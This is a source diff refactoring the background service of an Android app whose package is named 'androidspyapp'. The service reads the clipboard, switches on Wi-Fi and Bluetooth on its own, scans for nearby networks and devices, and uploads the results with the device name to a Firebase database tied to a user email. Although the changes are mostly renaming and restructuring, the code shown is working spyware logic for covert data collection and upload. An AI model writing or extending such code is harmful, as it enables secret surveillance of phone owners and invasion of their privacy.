@@ -5,13 +5,17 @@ import android.app.PendingIntent
 import android.app.Service
 import android.bluetooth.BluetoothAdapter
 import android.bluetooth.BluetoothDevice
-import android.content.*
+import android.content.ClipboardManager
+import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
 import android.net.wifi.WifiManager
 import android.os.IBinder
 import android.util.Log
 import com.google.firebase.database.FirebaseDatabase
+import com.komnacki.androidspyapp.receivers.BluetoothScanReceiver
 import com.komnacki.androidspyapp.receivers.WifiScanReceiver
 import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
 import io.reactivex.rxjava3.core.Observable
@@ -21,32 +25,16 @@ import kotlin.system.exitProcess
 
 
 class MainService : Service() {
-    private var bluetoothStateChange: MessageUtils.StateChange = MessageUtils.StateChange.NOT_CHANGE
     private lateinit var userEmail: String
     private lateinit var userPassword: String
 
-    private var s: Disposable? = null
-    private var mClipboardManager: ClipboardManager? = null
-    private val mScanResults: MutableList<WifiScanResult> = mutableListOf()
-    private var mScanResultsBluetooth: MutableList<BluetoothScanResult> = mutableListOf()
-    private var bluetoothAdapter: BluetoothAdapter? = null
+    private var disposable: Disposable? = null
+    private var clipboardManager: ClipboardManager? = null
+    private val wifiScanResults: MutableList<WifiScanResult> = mutableListOf()
+    private val bluetoothScanResults: MutableList<BluetoothScanResult> = mutableListOf()
+    private lateinit var bluetoothAdapter: BluetoothAdapter
     private lateinit var mWifiScanReceiver: WifiScanReceiver
-
-    private val bluetoothScanReceiver: BroadcastReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context?, intent: Intent?) {
-            if (intent != null && intent.action == BluetoothDevice.ACTION_FOUND) {
-                val device: BluetoothDevice? =
-                    intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
-                mScanResultsBluetooth.add(BluetoothScanResult(context!!, device))
-                unregisterReceiver(this)
-                if (bluetoothStateChange == MessageUtils.StateChange.CHANGE_TO_ENABLED) {
-                    val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
-                    bluetoothAdapter.disable()
-                }
-            }
-        }
-
-    }
+    private lateinit var mBluetoothScanReceiver: BluetoothScanReceiver
 
     override fun onCreate() {
         super.onCreate()
@@ -73,7 +61,7 @@ class MainService : Service() {
     }
 
     override fun stopService(name: Intent?): Boolean {
-        dispose(s)
+        dispose(disposable)
         return super.stopService(name)
     }
 
@@ -99,8 +87,8 @@ class MainService : Service() {
             }
         }
 
-        if (s == null || s!!.isDisposed) {
-            s = Observable.just(1)
+        if (disposable == null || disposable!!.isDisposed) {
+            disposable = Observable.just(1)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
                 .subscribe({ action ->
@@ -141,9 +129,9 @@ class MainService : Service() {
 
     private fun getClipboard() {
         try {
-            mClipboardManager =
+            clipboardManager =
                 applicationContext.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            mClipboardManager!!.primaryClip!!.getItemAt(0)
+            clipboardManager!!.primaryClip!!.getItemAt(0)
 
         } catch (e: Exception) {
             Log.e("ERROR: ", e.message + ", " + e.cause)
@@ -151,27 +139,25 @@ class MainService : Service() {
     }
 
     private fun scanBluetoothNetwork() {
-        if (bluetoothAdapter != null) {
-            if (!bluetoothAdapter!!.isEnabled) {
-                bluetoothStateChange = MessageUtils.StateChange.CHANGE_TO_ENABLED
-                bluetoothAdapter!!.enable()
+        mBluetoothScanReceiver = BluetoothScanReceiver { items -> bluetoothScanResults.addAll(items) }
+
+        bluetoothAdapter.let {adapter ->
+            if (!adapter.isEnabled) {
+                mBluetoothScanReceiver.state = MessageUtils.StateChange.CHANGE_TO_ENABLED
+                adapter.enable()
             }
-            if (bluetoothAdapter != null && bluetoothAdapter!!.isEnabled) {
-                registerReceiver(bluetoothScanReceiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
-                bluetoothAdapter!!.startDiscovery()
+            if (adapter.isEnabled) {
+                registerReceiver(mBluetoothScanReceiver, IntentFilter(BluetoothDevice.ACTION_FOUND))
+                bluetoothAdapter.startDiscovery()
             }
         }
     }
 
-    private fun addScanResult(items: List<WifiScanResult>) {
-        mScanResults.addAll(items)
-    }
-
     private fun scanWifiNetwork() {
         val mWifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
-        mWifiScanReceiver = WifiScanReceiver(mWifiManager, ::addScanResult)
 
         if (!mWifiManager.isWifiEnabled) {
+            mWifiScanReceiver = WifiScanReceiver(mWifiManager) { items -> wifiScanResults.addAll(items) }
             mWifiScanReceiver.state = MessageUtils.StateChange.CHANGE_TO_ENABLED
             mWifiManager.isWifiEnabled = true
         }
@@ -193,10 +179,9 @@ class MainService : Service() {
     private fun writeNew() {
         val messageUtils = MessageUtils.getInstance(this, userEmail)
         messageUtils.sendData(
-            mWifiScanReceiver.state,
-            bluetoothAdapter!!.name,
-            mScanResults,
-            mScanResultsBluetooth
+            bluetoothAdapter.name,
+            wifiScanResults,
+            bluetoothScanResults
         )
     }
 
